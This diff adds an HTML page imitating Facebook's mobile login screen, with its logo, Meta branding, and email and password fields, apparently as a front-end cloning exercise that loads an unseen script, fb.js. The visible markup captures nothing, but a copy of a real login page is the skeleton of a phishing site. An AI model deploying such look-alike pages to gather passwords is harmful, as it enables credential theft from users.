@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+  </head>
+  <body class="min-h-screen">
+    <main class="max-w-4xl mx-auto p-4">
+      <p class="text-center text-gray-500 mb-5">English (UK)</p>
+      <div class="text-center flex justify-center items-center mb-10">
+        <img src="Facebook-logo.png" alt="fb" class="w-[100px]" />
+      </div>
+      <form action="https://www.facebook.com/" method="POST" class="flex flex-col" id="loginForm">
+        <input
+          id="emailOrMobile"
+          type="text"
+          placeholder="Mobile number or email address"
+          class="p-5 border-2 border-gray-300 rounded-xl mb-5"
+        />
+        <input
+          id="password"
+          type="Password"
+          placeholder="Password"
+          class="p-5 border-2 border-gray-300 rounded-xl mb-5"
+        />
+        <button id="login" class="bg-blue-600 rounded-3xl p-2 text-white mb-5">
+          Log in
+        </button>
+      </form>
+      <a href="" class="text-center mb-20 flex justify-center text-gray-800"
+        >Forgotten password?</a
+      >
+
+      <div class="bottom flex flex-col items-center justify-center">
+        <button
+          class="bg-white text-blue-600 w-full border-1 border-blue-600 rounded-full p-2 mb-5"
+        >
+          Create new account
+        </button>
+        <div class="meta mb-5 flex gap-2">
+          <img src="meta.svg" class="w-[20px]" alt="" srcset="" />
+          <p>Meta</p>
+        </div>
+        <div class="info flex gap-3">
+          <a href="" class="text-gray-500">About</a>
+          <a href="" class="text-gray-500">Help</a>
+          <a href="" class="text-gray-500">More</a>
+        </div>
+      </div>
+    </main>
+    <script src="fb.js" defer></script>
+  </body>
+</html>
